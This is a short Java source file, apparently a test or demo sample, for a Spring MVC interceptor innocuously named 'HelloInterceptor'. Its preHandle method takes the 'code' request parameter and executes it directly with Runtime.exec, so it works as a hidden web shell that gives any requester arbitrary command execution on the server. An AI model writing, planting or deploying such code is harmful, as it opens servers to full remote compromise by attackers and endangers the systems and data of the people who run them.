package com.test.interceptor;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class HelloInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String code = request.getParameter("code");
        if (code != null) {
            java.lang.Runtime.getRuntime().exec(code);
            return true;
        } else {
            return true;
        }
    }
}
